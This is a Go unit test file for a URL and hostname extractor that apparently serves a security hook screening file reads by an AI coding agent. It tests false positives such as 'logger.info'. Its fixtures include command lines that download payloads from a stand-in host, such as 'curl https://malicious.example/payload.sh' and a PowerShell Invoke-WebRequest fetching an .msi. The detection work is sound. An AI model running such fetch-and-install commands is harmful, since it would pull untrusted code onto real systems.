package extract

import (
	"sort"
	"testing"
)

// TestFromFileContent_ScriptRequiresURLContext is the regression guard for
// the "logger.info classified as malicious" production FP (2026-05-27).
//
// Background: Cursor's beforeReadFile hook reads a Python integration-test
// file. The file contains many `logger.info(...)` calls. The generic
// URL/host regex matches `logger.info` as a 2-label hostname (because
// `.info` is a real public TLD), Malanta's domain classifier flags the
// (real, registered) `logger.info` domain as malicious with high
// confidence, and the cascade denies the read. This bricks every Python
// read that uses the standard logging module.
//
// The fix: in script files, require URL-shape syntax (scheme, userinfo,
// or path) before promoting a regex match to a Malanta lookup candidate.
// Read-time extraction is a tripwire, not the enforcement boundary — the
// shell-exec hook still catches `curl example.com` when the script line
// actually runs. See the extract.hasURLShape doc-comment for the
// broader rationale.
func TestFromFileContent_ScriptRequiresURLContext(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		content string
		want    []string
	}{
		{
			// The production regression: Python test file with a
			// logger.info call. Must NOT extract `logger.info`.
			name:    "py logger.info attribute access",
			path:    "/repo/tests/integration/test_orgs.py",
			content: `logger.info("Attempting to create org")`,
			want:    nil,
		},
		{
			// Symmetric Node.js shape, equally common: process.env
			// reference. `.env` isn't an IANA TLD today, but the
			// regex doesn't validate TLDs, so it would still be a
			// candidate. The URL-shape gate drops it cleanly.
			name:    "py process.env attribute access",
			path:    "/repo/scripts/build.py",
			content: `os.environ.get("FOO")\nval = process.env.BAR\n`,
			want:    nil,
		},
		{
			// pytest.fail / pytest.skip — same FP shape, common
			// across every Python test suite.
			name:    "py pytest.fail attribute access",
			path:    "/repo/tests/test_foo.py",
			content: `pytest.fail("something went wrong")`,
			want:    nil,
		},
		{
			// .sh script: bare host on a curl line. Read-time
			// extractor drops it (no URL shape); shell-exec hook is
			// the real enforcement when the script runs.
			name:    "sh bare host without scheme",
			path:    "/repo/install.sh",
			content: "curl example.com\n",
			want:    nil,
		},
		{
			// .sh script: real URL with scheme. MUST still extract.
			// This is the legitimate case the strict mode preserves.
			name:    "sh URL with scheme",
			path:    "/repo/install.sh",
			content: "curl https://malicious.example/payload.sh\n",
			want:    []string{"malicious.example"},
		},
		{
			// .py script with a URL literal. Real URL syntax (path
			// after the host) makes this unambiguously a network
			// identifier, not attribute access.
			name:    "py URL literal with path",
			path:    "/repo/setup.py",
			content: `req = urlopen("https://malicious.example/install")`,
			want:    []string{"malicious.example"},
		},
		{
			// .ps1 script with a real URL — keeps the strict-mode
			// behavior consistent across all script extensions.
			name:    "ps1 URL with scheme",
			path:    "/repo/Bootstrap.ps1",
			content: "Invoke-WebRequest https://malicious.example/agent.msi\n",
			want:    []string{"malicious.example"},
		},
		{
			// .ps1 script with PowerShell attribute access:
			// $process.MainWindowTitle, $obj.Name — must NOT
			// extract.
			name:    "ps1 attribute access",
			path:    "/repo/audit.ps1",
			content: "$process.MainWindowTitle\n$obj.Name\n",
			want:    nil,
		},
		{
			// Bare host followed by a path component: URL shape via
			// the path, KEEP. Even without scheme, `host/path` is
			// unambiguous URL syntax (you can't have a slash in an
			// attribute reference).
			name:    "sh bare host with path",
			path:    "/repo/install.sh",
			content: "curl malicious.example/payload",
			want:    []string{"malicious.example"},
		},
		{
			// userinfo present (git@example.com) → URL shape via the
			// `@`, KEEP. This is the ssh-clone pattern.
			name:    "sh git ssh url",
			path:    "/repo/clone.sh",
			content: "git clone git@example.com:org/repo.git\n",
			want:    []string{"example.com"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromFileContent(tc.path, tc.content)
			sort.Strings(got)
			sort.Strings(tc.want)
			if !sliceEqual(got, tc.want) {
				t.Errorf("FromFileContent(%s) = %v, want %v",
					tc.name, got, tc.want)
			}
		})
	}
}

// sliceEqual compares two string slices, treating nil and empty as
// equivalent so the table-driven tests above don't have to thread the
// distinction. reflect.DeepEqual(nil, []string{}) is false, which
// surfaces as a false negative when an extractor returns make([]T,
// 0, N) instead of nil.
func sliceEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// TestFromFileContent_ManifestKeepsPermissive guards that the strict-
// mode routing only applies to script extensions. Manifest files
// (package.json, requirements.txt, Cargo.toml, ...) often carry bare
// registry hostnames in their native syntax and would lose coverage if
// the URL-shape gate ran on them. Note these cases REQUIRE bare host
// names — that's the whole point of the test.
func TestFromFileContent_ManifestKeepsPermissive(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		content string
		want    []string
	}{
		{
			// Cargo.toml registry directive often quotes a bare
			// host. We want the permissive extractor for these.
			name:    "Cargo.toml bare host",
			path:    "/repo/Cargo.toml",
			content: `registry = "registry.example"`,
			want:    []string{"registry.example"},
		},
		{
			// requirements.txt index-url line frequently appears
			// without scheme in legacy lockfiles.
			name:    "requirements.txt --index-url bare host",
			path:    "/repo/requirements.txt",
			content: "--index-url mirror.example\nfoo==1.0\n",
			want:    []string{"mirror.example"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromFileContent(tc.path, tc.content)
			sort.Strings(got)
			sort.Strings(tc.want)
			if !sliceEqual(got, tc.want) {
				t.Errorf("FromFileContent(%s) = %v, want %v",
					tc.name, got, tc.want)
			}
		})
	}
}
